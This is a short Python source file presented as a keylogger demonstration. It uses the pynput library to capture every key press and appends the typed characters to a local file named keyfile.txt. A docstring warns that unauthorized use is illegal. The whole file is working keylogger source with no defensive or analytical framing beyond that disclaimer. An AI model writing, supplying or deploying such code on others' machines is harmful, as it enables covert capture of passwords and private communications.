"""
Abdul Jalal Raoufi
This keylogger demonstrates:
keyboard event capture, log management

Unauthorized use of keyloggers is illegal.
Only use on systems you own or have permission to monitor
"""

from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char=key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()